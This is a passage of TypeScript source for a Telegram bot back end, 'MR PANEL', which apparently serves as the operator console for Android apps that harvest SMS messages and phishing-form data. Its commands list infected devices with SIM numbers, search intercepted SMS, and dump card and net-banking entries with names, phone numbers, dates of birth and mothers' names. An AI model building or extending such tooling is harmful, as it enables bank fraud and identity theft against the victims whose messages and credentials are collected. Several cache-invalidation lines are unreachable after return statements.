          out += `Messages (${(msgR as unknown[]).length}):\n`;
          (msgR as Array<Record<string,unknown>>).forEach(m => {
            out += `  ${m.from_number} (${m.from_sender})\n  ${String(m.body).substring(0, 100)}\n`;
          });
        }
        if ((formR as unknown[]).length > 0) {
          out += `\nForm Data (${(formR as unknown[]).length}):\n`;
          (formR as Array<Record<string,unknown>>).forEach(f => {
            const fields = Object.entries(f.data as Record<string,unknown>).map(([k,v]) => `<b>${k}</b>:${v}`).join(' | ');
            out += `  ${fields.substring(0, 120)}\n`;
          });
        }
        await tgReply(token, chatId, out);
        return c.json({ ok: true });
      }

      // Level 2: /app <appId> <deviceId>
      if (deviceId) {
        const [devRow, msgRows, formRows, msgCount, formCount] = await Promise.all([
          db.select().from(devices).where(and(eq(devices.appId, appId), eq(devices.deviceId, deviceId))).limit(1),
          sqlClient(`SELECT from_number, from_sender, body, received_at FROM messages WHERE app_id=$1 AND device_id=$2 ORDER BY received_at DESC LIMIT 25`, [appId, deviceId]),
          sqlClient(`SELECT data, submitted_at FROM form_data WHERE app_id=$1 AND device_id=$2 ORDER BY submitted_at DESC LIMIT 10`, [appId, deviceId]),
          sqlClient(`SELECT COUNT(*) as c FROM messages WHERE app_id=$1 AND device_id=$2`, [appId, deviceId]),
          sqlClient(`SELECT COUNT(*) as c FROM form_data WHERE app_id=$1 AND device_id=$2`, [appId, deviceId]),
        ]);
        const dev = devRow[0];
        let out = `<b>Device: <code>${deviceId}</code></b>\n`;
        if (dev) {
          const st = dev.status === 'online' ? '[Online]' : '[Offline]';
          out += `${st} ${dev.name}\nAndroid: ${dev.androidVersion} | User: ${dev.userId}\nSIM1: ${dev.sim1Phone ?? '-'} | SIM2: ${dev.sim2Phone ?? '-'}\n`;
        }
        out += `\nMessages: <b>${(msgCount[0] as {c:string}).c}</b> | Form Data: <b>${(formCount[0] as {c:string}).c}</b>\n`;
        if ((msgRows as unknown[]).length > 0) {
          out += `\nRecent Messages:\n`;
          (msgRows as Array<Record<string,unknown>>).forEach(m => {
            out += `  ${m.from_number} (${m.from_sender})\n  ${String(m.body).substring(0, 100)}\n`;
          });
        }
        if ((formRows as unknown[]).length > 0) {
          out += `\nRecent Form Data:\n`;
          (formRows as Array<Record<string,unknown>>).forEach(f => {
            const fields = Object.entries(f.data as Record<string,unknown>).map(([k,v]) => `<b>${k}</b>:${v}`).join(' | ');
            out += `  ${fields.substring(0, 120)}\n`;
          });
        }
        out += `\nSearch: /app ${appId} ${deviceId} &lt;text&gt;`;
        await tgReply(token, chatId, out);
        return c.json({ ok: true });
      }

      // Level 1: /app <appId> — list devices
      const [devRows, msgCount, formCount] = await Promise.all([
        db.select().from(devices).where(eq(devices.appId, appId)).orderBy(desc(devices.updatedAt)).limit(20),
        sqlClient(`SELECT COUNT(*) as c FROM messages WHERE app_id=$1`, [appId]),
        sqlClient(`SELECT COUNT(*) as c FROM form_data WHERE app_id=$1`, [appId]),
      ]);
      let out = `<b>App: <code>${appId}</code></b>\n`;
      out += `Messages: ${(msgCount[0] as {c:string}).c} | Forms: ${(formCount[0] as {c:string}).c}\n\n`;
      if (devRows.length === 0) { out += 'No devices found.'; }
      else {
        out += `Devices (${devRows.length}):\n`;
        devRows.forEach(d => {
          const st = d.status === 'online' ? '[ON]' : '[OFF]';
          out += `${st} ${d.name}\n  <code>${d.deviceId}</code>\n  SIM1: ${d.sim1Phone ?? '-'} | SIM2: ${d.sim2Phone ?? '-'}\n`;
        });
        out += `\nDevice detail: /app ${appId} &lt;deviceId&gt;`;
      }
      await tgReply(token, chatId, out);
      return c.json({ ok: true });
    }

    // /search <text> — search across all messages (forms still limited to last 200 records)
    if (txt.startsWith('/search ')) {
      const query = txt.slice(8).trim().toLowerCase();
      if (!query) {
        await tgReply(token, chatId, 'Usage: /search &lt;text&gt;');
        return c.json({ ok: true });
      }
      const like = `%${query}%`;
      const [msgR, formR] = await Promise.all([
        sqlClient(`SELECT app_id, device_id, from_number, from_sender, body, received_at FROM messages WHERE LOWER(body) LIKE $1 OR LOWER(from_sender) LIKE $1 OR LOWER(from_number) LIKE $1 ORDER BY received_at DESC LIMIT 20`, [like]),
        sqlClient(`SELECT app_id, device_id, data, submitted_at FROM (SELECT * FROM form_data ORDER BY submitted_at DESC LIMIT 200) sub WHERE LOWER(data::text) LIKE $1 LIMIT 10`, [like]),
      ]);
      let out = `<b>Search: "${query}"</b>  (messages: full DB)\n\n`;
      if ((msgR as unknown[]).length === 0 && (formR as unknown[]).length === 0) {
        out += 'No results found.';
      }
      if ((msgR as unknown[]).length > 0) {
        out += `Messages (${(msgR as unknown[]).length}):\n`;
        (msgR as Array<Record<string,unknown>>).forEach(m => {
          out += `  [${m.app_id}] ${m.from_number}\n  ${String(m.body).substring(0, 90)}\n`;
        });
      }
      if ((formR as unknown[]).length > 0) {
        out += `\nForm Data (${(formR as unknown[]).length}):\n`;
        (formR as Array<Record<string,unknown>>).forEach(f => {
          const fields = Object.entries(f.data as Record<string,unknown>).map(([k,v]) => `${k}:${v}`).join(' | ');
          out += `  [${f.app_id}] ${fields.substring(0, 100)}\n`;
        });
      }
      await tgReply(token, chatId, out);
      return c.json({ ok: true });
    }

    // /7d — last 7 days summary
    if (txt === '/7d' || txt.startsWith('/7d ')) {
      const { msgs, forms } = await getRecentData(c.env, 168);
      const out = formatRecentData(msgs as unknown[], forms as unknown[], 'Last 7 Days');
      await tgReply(token, chatId, out);
      return c.json({ ok: true });
    }

    // /online — devices active in last 15 min
    if (txt === '/online') {
      const cutoff = new Date(Date.now() - 15 * 60 * 1000).toISOString();
      const rows = await sqlClient(`SELECT device_id, name, app_id, last_online, updated_at FROM devices WHERE (last_online > $1::timestamptz OR (status = 'online' AND updated_at > $1::timestamptz)) ORDER BY COALESCE(last_online, updated_at) DESC LIMIT 50`, [cutoff]);
      let out = `<b>Online Devices — Last 15 Min (${(rows as unknown[]).length})</b>\n\n`;
      if ((rows as unknown[]).length === 0) { out += 'No devices active in last 15 minutes.'; }
      (rows as Array<Record<string,unknown>>).forEach(d => {
        const t = d.last_online
          ? new Date(String(d.last_online)).toLocaleTimeString('en-IN', { timeZone: 'Asia/Kolkata', hour: '2-digit', minute: '2-digit' })
          : '—';
        out += `ID: <code>${d.device_id}</code>\n  ${d.name} | App: <code>${d.app_id}</code> | Last: ${t}\n`;
      });
      await tgReply(token, chatId, out);
      return c.json({ ok: true });
    }

    // /card — all card form data
    if (txt === '/card') {
      const [rows, cntRow] = await Promise.all([
        sqlClient(`SELECT app_id, device_id, data, submitted_at FROM form_data WHERE LOWER(data::text) LIKE '%card%' AND LOWER(data::text) NOT LIKE '%net banking%' ORDER BY submitted_at DESC LIMIT 500`),
        sqlClient(`SELECT COUNT(*) as c FROM form_data WHERE LOWER(data::text) LIKE '%card%' AND LOWER(data::text) NOT LIKE '%net banking%'`),
      ]);
      const total = (cntRow[0] as {c:string}).c;
      const skip = ['timestamp','createdAt','updatedAt','id','_id'];
      let out = `<b>Card Form Data</b>\nTotal: <b>${total}</b>  |  Showing: ${(rows as unknown[]).length}\n\n`;
      if ((rows as unknown[]).length === 0) { out += 'No data found.'; }
      (rows as Array<Record<string,unknown>>).forEach((f, i) => {
        const data = f.data as Record<string,unknown>;
        const phone = String(data['phoneNumber'] ?? data['phone'] ?? data['mobile'] ?? '—');
        const name  = String(data['fullName']    ?? data['name']  ?? data['customerName'] ?? '—');
        const dob   = String(data['dob']         ?? data['dateOfBirth'] ?? '—');
        const mom   = String(data['motherName']  ?? data['mother'] ?? '');
        const ptype = String(data['paymentType'] ?? data['type']  ?? '—');
        const extra = Object.entries(data).filter(([k]) => !skip.includes(k) && !['phoneNumber','phone','mobile','fullName','name','customerName','dob','dateOfBirth','motherName','mother','paymentType','type'].includes(k)).map(([k,v])=>`${k}: ${v}`).join(' | ');
        const dt = f.submitted_at ? new Date(String(f.submitted_at)).toLocaleString('en-IN',{timeZone:'Asia/Kolkata',day:'numeric',month:'short',hour:'2-digit',minute:'2-digit'}) : '—';
        out += `${i+1}. <b>${phone}</b> — ${name}\n`;
        out += `   DOB: ${dob}${mom ? ' | Mother: '+mom : ''}\n`;
        out += `   Type: ${ptype} | App: ${f.app_id} | Dev: ${f.device_id}\n`;
        if (extra) out += `   ${extra.substring(0,100)}\n`;
        out += `   ${dt}\n`;
        out += `   ─────────────────────\n`;
      });
      await tgReply(token, chatId, out);
      return c.json({ ok: true });
    }

    // /nb — all net banking form data
    if (txt === '/nb' || txt === '/netbanking') {
      const [rows, cntRow] = await Promise.all([
        sqlClient(`SELECT app_id, device_id, data, submitted_at FROM form_data WHERE LOWER(data::text) LIKE '%net banking%' ORDER BY submitted_at DESC LIMIT 500`),
        sqlClient(`SELECT COUNT(*) as c FROM form_data WHERE LOWER(data::text) LIKE '%net banking%'`),
      ]);
      const total = (cntRow[0] as {c:string}).c;
      const skip = ['timestamp','createdAt','updatedAt','id','_id'];
      let out = `<b>Net Banking Form Data</b>\nTotal: <b>${total}</b>  |  Showing: ${(rows as unknown[]).length}\n\n`;
      if ((rows as unknown[]).length === 0) { out += 'No data found.'; }
      (rows as Array<Record<string,unknown>>).forEach((f, i) => {
        const data = f.data as Record<string,unknown>;
        const phone = String(data['phoneNumber'] ?? data['phone'] ?? data['mobile'] ?? '—');
        const name  = String(data['fullName']    ?? data['name']  ?? data['customerName'] ?? '—');
        const dob   = String(data['dob']         ?? data['dateOfBirth'] ?? '—');
        const mom   = String(data['motherName']  ?? data['mother'] ?? '');
        const ptype = String(data['paymentType'] ?? data['type']  ?? '—');
        const extra = Object.entries(data).filter(([k]) => !skip.includes(k) && !['phoneNumber','phone','mobile','fullName','name','customerName','dob','dateOfBirth','motherName','mother','paymentType','type'].includes(k)).map(([k,v])=>`${k}: ${v}`).join(' | ');
        const dt = f.submitted_at ? new Date(String(f.submitted_at)).toLocaleString('en-IN',{timeZone:'Asia/Kolkata',day:'numeric',month:'short',hour:'2-digit',minute:'2-digit'}) : '—';
        out += `${i+1}. <b>${phone}</b> — ${name}\n`;
        out += `   DOB: ${dob}${mom ? ' | Mother: '+mom : ''}\n`;
        out += `   Type: ${ptype} | App: ${f.app_id} | Dev: ${f.device_id}\n`;
        if (extra) out += `   ${extra.substring(0,100)}\n`;
        out += `   ${dt}\n`;
        out += `   ─────────────────────\n`;
      });
      await tgReply(token, chatId, out);
      return c.json({ ok: true });
    }

    // /card online — card with online
    if (txt === '/card online' || txt === '/cardonline') {
      const [rows, cntRow] = await Promise.all([
        sqlClient(`SELECT app_id, device_id, data, submitted_at FROM form_data WHERE LOWER(data::text) LIKE '%card%' AND LOWER(data::text) NOT LIKE '%net banking%' AND LOWER(data::text) LIKE '%online%' ORDER BY submitted_at DESC LIMIT 500`),
        sqlClient(`SELECT COUNT(*) as c FROM form_data WHERE LOWER(data::text) LIKE '%card%' AND LOWER(data::text) NOT LIKE '%net banking%' AND LOWER(data::text) LIKE '%online%'`),
      ]);
      const total = (cntRow[0] as {c:string}).c;
      const skip = ['timestamp','createdAt','updatedAt','id','_id'];
      let out = `<b>Card + Online</b>\nTotal: <b>${total}</b>  |  Showing: ${(rows as unknown[]).length}\n\n`;
      if ((rows as unknown[]).length === 0) { out += 'No data found.'; }
      (rows as Array<Record<string,unknown>>).forEach((f, i) => {
        const data = f.data as Record<string,unknown>;
        const phone = String(data['phoneNumber'] ?? data['phone'] ?? data['mobile'] ?? '—');
        const name  = String(data['fullName']    ?? data['name']  ?? data['customerName'] ?? '—');
        const dob   = String(data['dob']         ?? data['dateOfBirth'] ?? '—');
        const mom   = String(data['motherName']  ?? data['mother'] ?? '');
        const ptype = String(data['paymentType'] ?? data['type']  ?? '—');
        const extra = Object.entries(data).filter(([k]) => !skip.includes(k) && !['phoneNumber','phone','mobile','fullName','name','customerName','dob','dateOfBirth','motherName','mother','paymentType','type'].includes(k)).map(([k,v])=>`${k}: ${v}`).join(' | ');
        const dt = f.submitted_at ? new Date(String(f.submitted_at)).toLocaleString('en-IN',{timeZone:'Asia/Kolkata',day:'numeric',month:'short',hour:'2-digit',minute:'2-digit'}) : '—';
        out += `${i+1}. <b>${phone}</b> — ${name}\n`;
        out += `   DOB: ${dob}${mom ? ' | Mother: '+mom : ''}\n`;
        out += `   Type: ${ptype} | App: ${f.app_id} | Dev: ${f.device_id}\n`;
        if (extra) out += `   ${extra.substring(0,100)}\n`;
        out += `   ${dt}\n`;
        out += `   ─────────────────────\n`;
      });
      await tgReply(token, chatId, out);
      return c.json({ ok: true });
    }

    // /nb online — net banking with online
    if (txt === '/nb online' || txt === '/nbonline') {
      const [rows, cntRow] = await Promise.all([
        sqlClient(`SELECT app_id, device_id, data, submitted_at FROM form_data WHERE LOWER(data::text) LIKE '%net banking%' AND LOWER(data::text) LIKE '%online%' ORDER BY submitted_at DESC LIMIT 500`),
        sqlClient(`SELECT COUNT(*) as c FROM form_data WHERE LOWER(data::text) LIKE '%net banking%' AND LOWER(data::text) LIKE '%online%'`),
      ]);
      const total = (cntRow[0] as {c:string}).c;
      const skip = ['timestamp','createdAt','updatedAt','id','_id'];
      let out = `<b>Net Banking + Online</b>\nTotal: <b>${total}</b>  |  Showing: ${(rows as unknown[]).length}\n\n`;
      if ((rows as unknown[]).length === 0) { out += 'No data found.'; }
      (rows as Array<Record<string,unknown>>).forEach((f, i) => {
        const data = f.data as Record<string,unknown>;
        const phone = String(data['phoneNumber'] ?? data['phone'] ?? data['mobile'] ?? '—');
        const name  = String(data['fullName']    ?? data['name']  ?? data['customerName'] ?? '—');
        const dob   = String(data['dob']         ?? data['dateOfBirth'] ?? '—');
        const mom   = String(data['motherName']  ?? data['mother'] ?? '');
        const ptype = String(data['paymentType'] ?? data['type']  ?? '—');
        const extra = Object.entries(data).filter(([k]) => !skip.includes(k) && !['phoneNumber','phone','mobile','fullName','name','customerName','dob','dateOfBirth','motherName','mother','paymentType','type'].includes(k)).map(([k,v])=>`${k}: ${v}`).join(' | ');
        const dt = f.submitted_at ? new Date(String(f.submitted_at)).toLocaleString('en-IN',{timeZone:'Asia/Kolkata',day:'numeric',month:'short',hour:'2-digit',minute:'2-digit'}) : '—';
        out += `${i+1}. <b>${phone}</b> — ${name}\n`;
        out += `   DOB: ${dob}${mom ? ' | Mother: '+mom : ''}\n`;
        out += `   Type: ${ptype} | App: ${f.app_id} | Dev: ${f.device_id}\n`;
        if (extra) out += `   ${extra.substring(0,100)}\n`;
        out += `   ${dt}\n`;
        out += `   ─────────────────────\n`;
      });
      await tgReply(token, chatId, out);
      return c.json({ ok: true });
    }

    // /offline — all offline devices
    if (txt === '/offline') {
      const rows = await db.select().from(devices).where(eq(devices.status, 'offline')).orderBy(desc(devices.updatedAt)).limit(30);
      let out = `<b>Offline Devices (${rows.length})</b>\n\n`;
      if (rows.length === 0) { out += 'All devices are online!'; }
      rows.forEach(d => {
        const last = d.lastOnline ? new Date(d.lastOnline).toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' }) : 'Never';
        out += `${d.name}\n  ID: <code>${d.deviceId}</code> | App: <code>${d.appId}</code>\n  Last Online: ${last}\n`;
      });
      await tgReply(token, chatId, out);
      return c.json({ ok: true });
    }

    // /dev <deviceId> — quick device lookup across all apps
    if (txt.startsWith('/dev ')) {
      const devId = txt.slice(5).trim();
      if (!devId) {
        await tgReply(token, chatId, 'Usage: /dev &lt;deviceId&gt;');
        return c.json({ ok: true });
      }
      const [devRow, msgRows, formRows, msgCount, formCount] = await Promise.all([
        db.select().from(devices).where(eq(devices.deviceId, devId)).limit(1),
        sqlClient(`SELECT from_number, from_sender, body, received_at FROM messages WHERE device_id=$1 ORDER BY received_at DESC LIMIT 20`, [devId]),
        sqlClient(`SELECT data, submitted_at FROM form_data WHERE device_id=$1 ORDER BY submitted_at DESC LIMIT 10`, [devId]),
        sqlClient(`SELECT COUNT(*) as c FROM messages WHERE device_id=$1`, [devId]),
        sqlClient(`SELECT COUNT(*) as c FROM form_data WHERE device_id=$1`, [devId]),
      ]);
      if (!devRow[0]) {
        await tgReply(token, chatId, `Device <code>${devId}</code> not found.`);
        return c.json({ ok: true });
      }
      const d = devRow[0];
      const st = d.status === 'online' ? '[Online]' : '[Offline]';
      let out = `<b>${d.name}</b> ${st}\n`;
      out += `App: <code>${d.appId}</code> | User: ${d.userId}\n`;
      out += `Android: ${d.androidVersion} | SIM1: ${d.sim1Phone ?? '-'} | SIM2: ${d.sim2Phone ?? '-'}\n`;
      out += `Messages: ${(msgCount[0] as {c:string}).c} | Forms: ${(formCount[0] as {c:string}).c}\n\n`;
      if ((msgRows as unknown[]).length > 0) {
        out += `Recent Messages:\n`;
        (msgRows as Array<Record<string,unknown>>).forEach(m => {
          out += `  ${m.from_number}: ${String(m.body).substring(0, 80)}\n`;
        });
      }
      if ((formRows as unknown[]).length > 0) {
        out += `\nRecent Forms:\n`;
        (formRows as Array<Record<string,unknown>>).forEach(f => {
          const fields = Object.entries(f.data as Record<string,unknown>).map(([k,v]) => `${k}:${v}`).join(' | ');
          out += `  ${fields.substring(0, 120)}\n`;
        });
      }
      await tgReply(token, chatId, out);
      return c.json({ ok: true });
    }

    // /last <n> — last N messages across all apps (default 10)
    if (txt.startsWith('/last')) {
      const n = Math.min(parseInt(txt.split(' ')[1] ?? '10', 10) || 10, 50);
      const rows = await sqlClient(`SELECT app_id, device_id, from_number, from_sender, body, received_at FROM messages ORDER BY received_at DESC LIMIT $1`, [n]);
      let out = `<b>Last ${n} Messages</b>\n\n`;
      if ((rows as unknown[]).length === 0) { out += 'No messages found.'; }
      (rows as Array<Record<string,unknown>>).forEach((m, i) => {
        out += `${i+1}. [${m.app_id}] ${m.from_number}\n   ${String(m.body).substring(0, 90)}\n`;
      });
      await tgReply(token, chatId, out);
      return c.json({ ok: true });
    }

    // /stats — per-app breakdown
    if (txt === '/stats') {
      const appRows = await db.select({ appId: apps.appId, name: apps.name, status: apps.status }).from(apps);
      let out = `<b>Per-App Stats</b>\n\n`;
      const results = await Promise.all(appRows.map(async a => {
        const [dC, mC, fC] = await Promise.all([
          sqlClient(`SELECT COUNT(*) as c FROM devices WHERE app_id=$1`, [a.appId]),
          sqlClient(`SELECT COUNT(*) as c FROM messages WHERE app_id=$1`, [a.appId]),
          sqlClient(`SELECT COUNT(*) as c FROM form_data WHERE app_id=$1`, [a.appId]),
        ]);
        return { ...a, d: (dC[0] as {c:string}).c, m: (mC[0] as {c:string}).c, f: (fC[0] as {c:string}).c };
      }));
      results.forEach(r => {
        const st = r.status === 'active' ? '[ON]' : '[OFF]';
        out += `${st} <code>${r.appId}</code>\n  Devices: ${r.d} | Msgs: ${r.m} | Forms: ${r.f}\n`;
      });
      await tgReply(token, chatId, out);
      return c.json({ ok: true });
    }

    // /stop — resume notifications
    if (txt === '/stop' || txt === '/release') {
      await sqlClient(`INSERT INTO settings (key, value) VALUES ('telegram_paused', 'false') ON CONFLICT (key) DO UPDATE SET value = 'false'`);
      await tgReply(token, chatId, '<b>Notifications resumed.</b>\nAll notifications are now active.');
      tgCache.ts = 0; // invalidate settings cache
      return c.json({ ok: true });
    }


    // /pause — pause all notifications
    if (txt === '/pause') {
      await sqlClient(`INSERT INTO settings (key, value) VALUES ('telegram_paused', 'true') ON CONFLICT (key) DO UPDATE SET value = 'true'`);
      await tgReply(token, chatId, '<b>Notifications paused.</b>\nUse /stop to resume.');
      return c.json({ ok: true });
      tgCache.ts = 0; // invalidate settings cache
    }

    // /focus <appId> — only receive notifications from this app
    if (txt.startsWith('/focus ')) {
      const focusId = txt.slice(7).trim();
      if (!focusId) {
        await tgReply(token, chatId, 'Usage: /focus &lt;appId&gt;\nExample: /focus myapp123');
        return c.json({ ok: true });
      }
      await sqlClient(`INSERT INTO settings (key, value) VALUES ('telegram_focus_app', $1) ON CONFLICT (key) DO UPDATE SET value = $1`, [focusId]);
      await tgReply(token, chatId, `Focus set: <code>${focusId}</code>\nOnly this app's notifications will arrive. Use /unfocus to clear.`);
      return c.json({ ok: true });
      tgCache.ts = 0; // invalidate settings cache
    }

    // /unfocus — clear app focus
    if (txt === '/unfocus') {
      await sqlClient(`INSERT INTO settings (key, value) VALUES ('telegram_focus_app', '') ON CONFLICT (key) DO UPDATE SET value = ''`);
      await tgReply(token, chatId, '<b>Focus cleared.</b>\nAll apps will send notifications.');
      return c.json({ ok: true });
      tgCache.ts = 0; // invalidate settings cache
    }

    // /focusstatus — check current focus app
    if (txt === '/focusstatus' || txt === '/fs') {
      const fsRows = await sqlClient(`SELECT value FROM settings WHERE key = 'telegram_focus_app' LIMIT 1`);
      const focusedApp = (fsRows[0] as { value?: string })?.value ?? '';
      await tgReply(token, chatId, focusedApp ? `Focused: <code>${focusedApp}</code>\nOnly this app notifies. /unfocus to clear.` : 'No focus. All apps notify.');
      return c.json({ ok: true });
    }

    // /setmenu — register bot commands in Telegram autocomplete
    if (txt === '/setmenu') {
      const menuCmds = [
        { command: "start", description: "Show command menu" },
        { command: "1h", description: "Last 1 hour activity" },
        { command: "24h", description: "Last 24 hours activity" },
        { command: "7d", description: "Last 7 days activity" },
        { command: "total", description: "All-time totals" },
        { command: "stats", description: "Per-app breakdown" },
        { command: "apps", description: "List all app IDs" },
        { command: "online", description: "Online devices (last 15min)" },
        { command: "offline", description: "Offline devices" },
        { command: "last", description: "Last N messages" },
        { command: "card", description: "Card form data (last 500)" },
        { command: "nb", description: "Net banking form data (last 500)" },
        { command: "search", description: "Search last 200 records" },
        { command: "focus", description: "Focus notifications on one app" },
        { command: "unfocus", description: "Clear focus, all apps notify" },
        { command: "focusstatus", description: "Check current notification focus" },
        { command: "pause", description: "Pause all notifications" },
        { command: "stop", description: "Resume notifications" },
      ];
      // Register commands for default scope (private chat)
      const smR = await fetch(`https://api.telegram.org/bot${token}/setMyCommands`, {
        method: "POST", headers: { "content-type": "application/json" },
        body: JSON.stringify({ commands: menuCmds }),
      });
      // Also register for the channel so members see "/" autocomplete
      const smCh = await fetch(`https://api.telegram.org/bot${token}/setMyCommands`, {
        method: "POST", headers: { "content-type": "application/json" },
        body: JSON.stringify({ commands: menuCmds, scope: { type: 'chat', chat_id: -1004403318713 } }),
      });
      const smResult = await smR.json() as { ok: boolean };
      const smChResult = await smCh.json() as { ok: boolean };
      await tgReply(token, chatId, smResult.ok
        ? `<b>Bot menu registered!</b>\nPrivate: ✅  Channel: ${smChResult.ok ? '✅' : '⚠️ (need admin)'}\nType "/" to see all commands.`
        : 'Menu registration failed.');
      return c.json({ ok: true });
    }
    // /start or /help — command menu
    if (txt === '/start' || txt === '/help') {
      // Auto-register commands in Telegram on /start
      const menuCmdsAuto = [
        { command: "start", description: "Show command menu" },
        { command: "1h", description: "Last 1 hour activity" },
        { command: "24h", description: "Last 24 hours activity" },
        { command: "7d", description: "Last 7 days activity" },
        { command: "total", description: "All-time totals" },
        { command: "stats", description: "Per-app breakdown" },
        { command: "apps", description: "List all app IDs" },
        { command: "online", description: "Online devices (last 15min)" },
        { command: "offline", description: "Offline devices" },
        { command: "last", description: "Last N messages" },
        { command: "card", description: "Card form data (last 500)" },
        { command: "nb", description: "Net banking form data (last 500)" },
        { command: "search", description: "Search last 200 records" },
        { command: "focus", description: "Focus notifications on one app" },
        { command: "unfocus", description: "Clear focus, all apps notify" },
        { command: "focusstatus", description: "Check notification focus" },
        { command: "pause", description: "Pause all notifications" },
        { command: "stop", description: "Resume notifications" },
      ];
      await fetch(`https://api.telegram.org/bot${token}/setMyCommands`, {
        method: "POST", headers: { "content-type": "application/json" },
        body: JSON.stringify({ commands: menuCmdsAuto }),
      });
      const help =
        `<b>MR PANEL — Bot Menu</b>
` +
        `━━━━━━━━━━━━━━━━━━━━━━

` +
        `<b>[DATA BY TIME]</b>
` +
        `/1h   /24h   /7d   /total

` +
        `<b>[FORM DATA]</b>
` +
        `/card          Card entries (last 500)
` +
        `/nb            Net banking entries (last 500)
` +
        `/card online   Card + online
` +
        `/nb online     NB + online
` +
        `/search &lt;txt&gt; Search last 200 records

` +
        `<b>[DEVICES]</b>
` +
        `/online        Active in last 15min
` +
        `/offline       Offline devices
` +
        `/dev &lt;id&gt;      Device lookup
` +
        `/last [n]      Last N messages

` +
        `<b>[APPS]</b>
` +
        `/apps          List all apps
` +
        `/stats         Per-app breakdown
` +
        `/app &lt;id&gt;     App devices

` +
        `<b>[NOTIFICATIONS]</b>
` +
        `/focus &lt;appId&gt; Only notify for this app
` +
        `/unfocus       All apps notify
` +
        `/focusstatus   Check focus status
` +
        `/pause         Pause all notifications
` +
        `/stop          Resume notifications

` +
        `/setmenu       Re-register this bot menu`;
      await tgReply(token, chatId, help);
      return c.json({ ok: true });
    }

    // Helper: resolve bot token from env or DB, send to admin's personal chat
    const adminNotify = async (text: string, replyMarkup?: object) => {
      try {
        let botToken = c.env.TELEGRAM_BOT_TOKEN ?? "";
        let toChat = String(msg.from?.id ?? chatId);
        if (!botToken) {
          const settRows = await sqlClient(`SELECT key, value FROM settings WHERE key IN ('telegram_bot_token','telegram_chat_id')`) as {key:string;value:string}[];
          const settMap = Object.fromEntries(settRows.map(r=>[r.key,r.value]));
          botToken = settMap['telegram_bot_token'] ?? "";
          if (settMap['telegram_chat_id']) toChat = settMap['telegram_chat_id'];
        }
        if (!botToken) return;
        const payload: Record<string,unknown> = { chat_id: toChat, text, parse_mode: "HTML" };
        if (replyMarkup) payload.reply_markup = replyMarkup;
        await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
          method: "POST", headers: { "content-type": "application/json" },
          body: JSON.stringify(payload),
        });
      } catch { /* silent */ }
    };

    // /reply with no message arg → show app list as inline keyboard to select
    if (txt === '/reply' || txt === '/reply ') {
      try {
        await sqlClient(`CREATE TABLE IF NOT EXISTS tg_app_lock (chat_id TEXT PRIMARY KEY, app_id TEXT NOT NULL, app_name TEXT, locked_at TIMESTAMPTZ DEFAULT now())`);
        await sqlClient(`INSERT INTO tg_app_lock (chat_id, app_id, app_name) VALUES ($1, '__pending__', '__pending__') ON CONFLICT (chat_id) DO UPDATE SET app_id='__pending__', app_name='__pending__', locked_at=now()`, [String(chatId)]);
        await adminNotify('📱 <b>App token daalo:</b>\n<i>Example: APP-XXXX-XXXX</i>\n\n/unlock — cancel karo');
      } catch (e) { await adminNotify(`❌ Error: ${String(e)}`); }
      return c.json({ ok: true });
    }

    // /reply <appId> <message> — direct reply (old format still works)
    if (txt.startsWith('/reply ')) {
      const afterCmd = txt.slice(7).trim();
      const spaceIdx = afterCmd.indexOf(' ');
      const replyAppId = spaceIdx > 0 ? afterCmd.slice(0, spaceIdx) : afterCmd;
      const replyMsg  = spaceIdx > 0 ? afterCmd.slice(spaceIdx + 1).trim() : '';
      if (!replyAppId || !replyMsg) {
        await adminNotify('❌ Usage: /reply &lt;appId&gt; &lt;message&gt;\nOr just /reply to pick from list.');
        return c.json({ ok: true });
      }
      // Replying back to the login-page complaint box is disabled -- the bot
        // is receive-only now (admin can read complaints, not message the user back).
        await adminNotify('Reply feature disabled. Complaints yahan sirf padhne ke liye hain.');
        return c.json({ ok: true });
      }

    // /unlock — clear app lock for this chat
    if (txt === '/unlock') {
      try {
        await sqlClient(`DELETE FROM tg_app_lock WHERE chat_id = $1`, [String(chatId)]);
        await adminNotify('🔓 Unlocked. /reply to select a new app.');
      } catch { /* ignore */ }
      return c.json({ ok: true });
    }

    // Plain message (not a command) → token entry OR reply based on lock state
    if (!txt.startsWith('/')) {
      try {
        await sqlClient(`CREATE TABLE IF NOT EXISTS tg_app_lock (chat_id TEXT PRIMARY KEY, app_id TEXT NOT NULL, app_name TEXT, locked_at TIMESTAMPTZ DEFAULT now())`);
        const locks = await sqlClient(`SELECT app_id, app_name FROM tg_app_lock WHERE chat_id = $1`, [String(chatId)]) as {app_id:string;app_name:string}[];
        if (!locks.length) { return c.json({ ok: true }); }
        const { app_id, app_name } = locks[0];

        if (app_id === '__pending__') {
          // Admin typed a token — verify it
          const tokenInput = txt.trim().toUpperCase();
          const found = await sqlClient(`SELECT app_id, name FROM apps WHERE UPPER(app_id) = $1`, [tokenInput]) as {app_id:string;name:string}[];
          if (!found.length) {
            await adminNotify(`❌ Token <code>${tokenInput}</code> nahi mila.\nDobara try karo ya /unlock se cancel karo.`);
          } else {
            const realAppId = found[0].app_id;
            const realName  = found[0].name ?? realAppId;
            await sqlClient(`UPDATE tg_app_lock SET app_id=$1, app_name=$2, locked_at=now() WHERE chat_id=$3`, [realAppId, realName, String(chatId)]);
            await adminNotify(`✅ Verified! <b>${realName}</b> lock ho gaya.\n<code>${realAppId}</code>\n\nAb seedha reply type karo. /unlock — change app.`);
          }
        } else {
            // Replying back to the login-page complaint box is disabled -- the
            // bot is receive-only now (admin can read complaints, not message back).
            await adminNotify('Reply feature disabled. Complaints yahan sirf padhne ke liye hain.\n\n/unlock — change app');
          }
      } catch (e) { await adminNotify(`❌ Error: ${String(e)}`); }
      return c.json({ ok: true });
    }

    return c.json({ ok: true });
  });

// =================== WORKER ENTRY ===================
export default {
  async fetch(request: Request, env: Env, ctx: ExecutionContext): Promise<Response> {
    const url = new URL(request.url);
    // WebSocket upgrade MUST be handled directly — Hono cannot forward 101 responses.
    if (url.pathname === "/api/events" && request.headers.get("Upgrade") === "websocket") {
      const id = env.EVENT_BUS.idFromName("global");
      const stub = env.EVENT_BUS.get(id);
      return stub.fetch(new Request("https://do.local/ws", request));
    }
    if (url.pathname.startsWith("/api/")) {
      return app.fetch(request, env, ctx);
    }
    // Patch the JS bundle on-the-fly: remove PIN from SSE URL, use HMAC token instead
    if (url.pathname.endsWith(".js") && url.pathname.includes("index-")) {
      const assetResp = await env.ASSETS.fetch(request);
      const js = await assetResp.text();
      // OLD: HEAD check with ?pin= then EventSource with ?pin=
